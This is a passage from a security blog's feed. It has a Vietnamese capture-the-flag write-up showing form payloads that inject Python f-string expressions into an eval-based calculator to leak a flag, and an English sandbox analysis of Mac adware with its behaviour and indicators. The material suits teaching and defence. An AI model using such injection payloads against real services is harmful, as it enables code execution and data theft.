								<content:encoded><![CDATA[<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?ssl=1"><img data-attachment-id="735" data-permalink="https://babyphd.net/2018/07/17/meepwn-ctf-2018-pycalx2/2018-07-17_19-46-56/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=818%2C331&amp;ssl=1" data-orig-size="818,331" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="2018-07-17_19-46-56" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=300%2C121&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?fit=604%2C244&amp;ssl=1" class="aligncenter wp-image-735 size-full" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=604%2C244&#038;ssl=1" alt="" width="604" height="244" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?w=818&amp;ssl=1 818w, https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=300%2C121&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2018/07/2018-07-17_19-46-56.png?resize=768%2C311&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>Bài này code giống hệt bài 1, khác mỗi cái là biến <code>op</code> bây giờ cũng không được chứa các ký tự trong mảng <code>['(',')','[',']','\'','"']</code> nữa, do đó không thể dùng kiểu <code>+'</code> để break giá trị của <code>value2</code> ra ngoài chuỗi. Nói cách khác, <code>value1</code> và <code>value2</code> đều sẽ chỉ là các string đơn thuần.<span id="more-734"></span></p>
<p>Mình search thử thì thấy Python3.6 có một tính năng mới là <a href="https://docs.python.org/3/whatsnew/3.6.html" target="_blank" rel="noopener">Formatted string literals</a>, hoạt động như sau:</p>
<pre>Python 3.6.1 (v3.6.1:69c0db5, Mar 21 2017, 17:54:52) [MSC v.1900 32 bit (Intel)] on win32
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; a = 'xxx'
&gt;&gt;&gt; f'{a}'
'xxx'
&gt;&gt;&gt; f'{0 if 2 &gt; 3 else 1}'
'1'</pre>
<p>Có thể thấy đây gần như là hướng duy nhất của bài này.</p>
<p>Nếu <code>op = +f</code>, chuỗi được eval sẽ có dạng  <span style="color: #222222; font-family: monospace, serif;"><span style="font-size: 14px; background-color: #e9ebec;"><code>calc_eval = 'value1'+f'value2'</code></span></span>. Tương tự bài 1, chúng ta muốn dựa vào output của hàm eval để leak flag, mà output chỉ được in ra khi kết quả eval là số, là <code>'True'</code> hoặc <code>'False'</code>. Như thế dẫn đến một số suy luận sau:</p>
<ol>
<li>Vì <code>value1</code> kiểu gì cũng chỉ là chuỗi đơn thuần, nên sau khi eval nó sẽ vẫn là chính nó. Mặt khác, <code>value1</code> không thể là số vì nếu thế, <code>value2</code> cũng phải là số, chẳng có tác dụng gì. Vậy, <code>value1</code> là chữ.</li>
<li>Nếu <code>value1</code> là chữ, thì kết quả sau khi eval không thể là số, nghĩa là chúng ta chỉ có thể thấy được output nếu eval ra <code>True</code> hoặc <code>False</code>, thì <code>value1</code> cần là một phần của <code>True</code> hoặc <code>False</code> (ví dụ <code>Tr</code> hoặc <code>Fals</code>, để sau khi kết hợp với <code>value2</code> sẽ ra giá trị hoàn chỉnh). Về lý thuyết chúng ta có thể để <code>value2</code> trả về đầy đủ chuỗi <code>True</code> hoặc <code>False</code>, tuy nhiên đề bài không cho phép <code>value1</code> là một chuỗi rỗng.</li>
<li>Dạng biểu thức <code>f'{0 if 2 &gt; 3 else 1}'</code> có thể cho phép chúng ta leak flag giống bài 1, kiểu như <code>f'{'e' if 'MeePwn' in FLAG else 'x'}'</code>. Với biểu thức này, kết hợp với <code>value1 = Tru</code> thì khi nhận được output là <code>True</code>, chúng ta kết luận được FLAG có chứa chuỗi <code>MeePwn</code>, và ngược lại.</li>
</ol>
<p>Tất nhiên ở trên chỉ là ví dụ thôi, vì thực tế đề bài không cho dùng <code>'</code> trong <code>value2</code>. Sau một hồi ngồi nhìn màn hình, mình nghĩ ra một hướng khá là cần cù bù thông minh.</p>
<pre>Content-Disposition: form-data; name="value1"

Tru
----------954427002
Content-Disposition: form-data; name="op"

+f
----------954427002
Content-Disposition: form-data; name="value2"

{source % 101 if source % 77 in FLAG else x}
----------954427002
Content-Disposition: form-data; name="source"

%c</pre>
<p>Output nhận được là <code>True</code> (hợp lý vì FLAG có chứa chữ <code>M</code> trong từ <code>MeePwn</code>).</p>
<p>Nhưng check từng ký tự thì chỉ có thể tìm được charset của FLAG mà thôi, mình cần check được nhiều hơn. Do <code>value2</code> dài tối đa 64 ký tự, mình cố gắng xóa bớt mấy khoảng trắng, được như sau:</p>
<pre>Content-Disposition: form-data; name="value1"

Tru
----------954427002
Content-Disposition: form-data; name="op"

+f
----------954427002
Content-Disposition: form-data; name="value2"

{source%101 if source%77+source%101+source%101 in FLAG else x}
----------954427002
Content-Disposition: form-data; name="source"

%c</pre>
<p>3 ký tự một lúc là khá ổn, đủ để mình tìm được đến <code>MeePwnCTF{python3.6[_strikes_backk</code>. Sau đó thì phát sinh một vấn đề, đó là với 2 ký tự <code>kk</code>, mình tìm được 2 chuỗi thỏa mãn là <code>kkk</code> và <code>kk}</code>. Cái sau chắc là phần kết của FLAG rồi, nhưng cái đầu thì khá là bế tắc, do không biết cần chính xác bao nhiêu chữ <code>k</code>. Mình có thể thử submit dần luôn trên scoreboard, nhưng ngại nhỡ bị ban thì mang tội với team, còn nếu clone một nick mới để thử thì lại làm tăng số đội giải được, điểm của mình cũng bị ảnh hưởng. Đều không vẹn toàn.</p>
<p>Tự nhiên mình nghĩ đến một hướng, mặc dù đoán là không được nhưng vẫn quyết định thử:</p>
<pre>&gt;&gt;&gt; '%c' % 49 * 3
'111'</pre>
<p>Kỳ diệu. Mình cứ sợ là nó sẽ thành <code>'%c' % 147</code>.</p>
<p>FLAG: <code>MeePwnCTF{python3.6[_strikes_backkkkkkkkkkkk)}</code></p>
<p>P.S: Bài này Jinmo làm theo một cách thực sự rất đẹp và đáng được ngợi ca, mọi người có thể đọc tại <a href="https://github.com/Jinmo/ctfs/blob/master/2018/meepwn/pycalx_both.py" target="_blank" rel="noopener">đây</a>. Kudos to him!</p>
<p>&nbsp;</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">734</post-id>	</item>
		<item>
		<title>What is SafeFinder/OperatorMac campaign?</title>
		<link>https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/</link>
				<pubDate>Thu, 10 Aug 2017 15:35:08 +0000</pubDate>
		<dc:creator><![CDATA[phamus]]></dc:creator>
				<category><![CDATA[chuymich]]></category>
		<category><![CDATA[forensic]]></category>
		<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[vietnamese]]></category>
		<category><![CDATA[malware]]></category>
		<category><![CDATA[Mughthesec]]></category>
		<category><![CDATA[OperatorMac]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=687</guid>
				<description><![CDATA[&#160; A new variant of adware was just discovered yesterday. It’s going viral on Twitter and other media, since they use valid Apple developer certificate to sign all packed samples. I’m quite overbusy these days but it got my interest when seeing the name stated in that certificate: “Quoc Thinh”, quite a unique Vietnamese name. &#8230; <a href="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/" class="more-link">Continue reading <span class="screen-reader-text">What is SafeFinder/OperatorMac campaign?</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>&nbsp;</p>
<p>A new variant of adware was just discovered yesterday. It’s going viral on Twitter and other media, since they use valid Apple developer certificate to sign all packed samples. I’m quite overbusy these days but it got my interest when seeing the name stated in that certificate: “Quoc Thinh”, quite a unique Vietnamese name. So why not take a break from desperate thesis, toss adware in my lame automated MacOS analysis framework and see what our ‘countryman’ doing?</p>
<p><span id="more-687"></span>The sample was first noticed by <em>Gavriel State</em>‏ on Aug 7, then <em>Thomas A Reed</em> – the Mac malware boss hunter from Malwarebytes - confirmed it relates to OperatorMac on the next day. I think you all know the famous Mac free security tools’ author: <em>Patrick Wardle</em>, wrote an amazing report on <a href="https://objective-see.com/blog/blog_0x20.html">objective-see.com</a> in Aug 9. So I’m not going too deep in reverse engineering - static analysis, just throw in my Grey-cuckoo framework and grab results. In case somebody doesn’t know, it’s my thesis project and and soon to be released right after my judgment day - defense (hopefully).</p>
<p>From Patrick’s report we understand it’s an adware which installs lots of crabs. By default, cuckoo sandbox timeout is 120 sec. Let’s extend it a bit, 300 sec (5 min) would be enough.</p>
<p id="jztOQbU"><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?ssl=1"><img data-attachment-id="692" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c71a4b4bf1/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=1892%2C1159&amp;ssl=1" data-orig-size="1892,1159" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c71a4b4bf1" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=300%2C184&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?fit=604%2C370&amp;ssl=1" class="alignnone size-full wp-image-692 " src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=604&#038;ssl=1" alt="" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1892&amp;ssl=1 1892w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=300%2C184&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=768%2C470&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?resize=1024%2C627&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1208&amp;ssl=1 1208w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c71a4b4bf1.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>First result we got, that Apple developer ID “Quoc Thinh”, and he got his certificate revoked from Apple today by the way <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f604.png" alt="😄" class="wp-smiley" style="height: 1em; max-height: 1em;" />.</p>
<p><code>spctl -avv "Mughthesec-Player(dmg).dmg"<br />
Mughthesec-Player(dmg).dmg: <strong>CSSMERR_TP_CERT_REVOKED</strong></code></p>
<p>From captured screenshots, we can see what this adware apparently executes: Install Adobe flash and offer you a bunch of PUA (potential unwanted applications) – Booking, Advanced Mac Cleaner, SafeFinder Safari extension, and AdBlock (in some relevant samples that will be discussed later).</p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?ssl=1"><img data-attachment-id="696" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/webp-net-gifmaker/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=1390%2C869&amp;ssl=1" data-orig-size="1390,869" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Webp.net-gifmaker" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=300%2C188&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?fit=604%2C378&amp;ssl=1" class="alignnone wp-image-696" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=571%2C358&#038;ssl=1" alt="" width="571" height="358" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=300%2C188&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=768%2C480&amp;ssl=1 768w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?resize=1024%2C640&amp;ssl=1 1024w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/Webp.net-gifmaker.gif?w=1208&amp;ssl=1 1208w" sizes="(max-width: 571px) 100vw, 571px" data-recalc-dims="1" /></a></p>
<p>Behavioral analysis shows the packed DMG sample invoked a ‘mac’ binary, thereafter ‘Mughthesec’ with a persistence ‘I’ binary. Screenshots below already included other analysis variant of this campaign.</p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?ssl=1"><img data-attachment-id="693" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c722bde0a9/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=726%2C863&amp;ssl=1" data-orig-size="726,863" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c722bde0a9" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=252%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?fit=604%2C718&amp;ssl=1" class="alignnone wp-image-693 " src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?resize=275%2C327&#038;ssl=1" alt="" width="275" height="327" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?w=726&amp;ssl=1 726w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c722bde0a9.png?resize=252%2C300&amp;ssl=1 252w" sizes="(max-width: 275px) 100vw, 275px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?ssl=1"><img data-attachment-id="694" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c72309c103/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=732%2C1051&amp;ssl=1" data-orig-size="732,1051" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c72309c103" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=209%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?fit=604%2C867&amp;ssl=1" class="alignnone wp-image-694 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=224%2C322&#038;ssl=1" alt="" width="224" height="322" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?w=732&amp;ssl=1 732w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=209%2C300&amp;ssl=1 209w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c72309c103.png?resize=713%2C1024&amp;ssl=1 713w" sizes="(max-width: 224px) 100vw, 224px" data-recalc-dims="1" /></a><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?ssl=1"><img data-attachment-id="695" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c7244ef84c/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=917%2C1413&amp;ssl=1" data-orig-size="917,1413" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c7244ef84c" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=195%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?fit=604%2C930&amp;ssl=1" class="alignnone wp-image-695 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=297%2C458&#038;ssl=1" alt="" width="297" height="458" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?w=917&amp;ssl=1 917w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=195%2C300&amp;ssl=1 195w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=768%2C1183&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7244ef84c.png?resize=665%2C1024&amp;ssl=1 665w" sizes="(max-width: 297px) 100vw, 297px" data-recalc-dims="1" /></a></p>
<p>Move on to the network DNS feature, we see a lot of queries and some domains look "suspicious". Their DNS servers mostly are pointed to Akamai so I suggest we rather use domain as IOC than IP address, which could be different from viewers location. Filtering system calls logs with some rules of mine, there is no evasion technique been found. It’s quite surprising because Virustotal behavioral analysis shows a shorter execution trace than mine, which usually means its environment was detected at some point and malware stop running. In Patrick’s report he said there might be MAC address verification to detect VM (VM MAC usually starts with ’00:xx’). Fortunately, my VM framework MAC address was modified long ago since my colleague Yorick Koster at Securify used same trick to abuse my lame framework (thanks Yorick). I should add new rule – “MAC address check” later.</p>
<p id="zFlKkqi"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?ssl=1" target="_blank" rel="noopener"><img data-attachment-id="698" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c755999974/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=1949%2C1982&amp;ssl=1" data-orig-size="1949,1982" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c755999974" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=295%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?fit=604%2C614&amp;ssl=1" class=" alignnone wp-image-698 " src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=604%2C614&#038;ssl=1" alt="" width="604" height="614" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1949&amp;ssl=1 1949w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=295%2C300&amp;ssl=1 295w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=768%2C781&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?resize=1007%2C1024&amp;ssl=1 1007w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1208&amp;ssl=1 1208w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c755999974.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>Additionally instead of execve(), MacOS sandbox policy usually invokes processes using XPCProxy or launchd services. So we got several processes created with posix_spawn(): delete Safari, iBooks, Mail cache (likely Advanced Mac cleaner doing its job), install mentioned PUAs and we got some new IOCs.</p>
<p id="daBSQQC"><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?ssl=1"><img data-attachment-id="699" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c75725dafc/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=1950%2C755&amp;ssl=1" data-orig-size="1950,755" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c75725dafc" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=300%2C116&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?fit=604%2C234&amp;ssl=1" class="alignnone wp-image-699 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=604%2C234&#038;ssl=1" alt="" width="604" height="234" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1950&amp;ssl=1 1950w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=300%2C116&amp;ssl=1 300w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=768%2C297&amp;ssl=1 768w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?resize=1024%2C396&amp;ssl=1 1024w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1208&amp;ssl=1 1208w, https://i2.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c75725dafc.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p>Other great things from Cuckoo sandbox are Network analysis and Dropped files. However previous report detailed it well enough, hence only some screenshots from these features will be showed:</p>
<style>.gist table { margin-bottom: 0; }</style><div class="gist-oembed" data-gist="0f0a61788ffe53be1f1a08be33150962.json"></div>
<style>.gist table { margin-bottom: 0; }</style><div class="gist-oembed" data-gist="1830a8eb98f5ba755f1947386f7f93a0.json"></div>
<p>Some dropped binaries like AMCleaner (93dd0c34a4ec25a508cd6d5fb86d8ccc0c318238d9fee0c93342a20759bf9b7e) already marked as malicious on VirusTotal (VT) 7/56, which could be an indication for vigilant users.</p>
<p>Also with some fancy nonsense statistic screenshots, intent to scare analyst (:p)</p>
<p id="MQRWKqm"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?ssl=1"><img data-attachment-id="702" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c7796efc07/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=1950%2C987&amp;ssl=1" data-orig-size="1950,987" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c7796efc07" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=300%2C152&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?fit=604%2C306&amp;ssl=1" class="alignnone size-full wp-image-702 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=604&#038;ssl=1" alt="" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1950&amp;ssl=1 1950w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=300%2C152&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=768%2C389&amp;ssl=1 768w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?resize=1024%2C518&amp;ssl=1 1024w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1208&amp;ssl=1 1208w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c7796efc07.png?w=1812&amp;ssl=1 1812w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p id="WVLWtXn"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?ssl=1"><img data-attachment-id="703" data-permalink="https://babyphd.net/2017/08/10/wtf-is-safefinderoperatormac-campaign/img_598c779ebc535/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=1950%2C880&amp;ssl=1" data-orig-size="1950,880" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_598c779ebc535" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=300%2C135&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?fit=604%2C273&amp;ssl=1" class="alignnone size-full wp-image-703 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=604&#038;ssl=1" alt="" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/08/img_598c779ebc535.png?w=1950&amp;ssl=1 1950w, 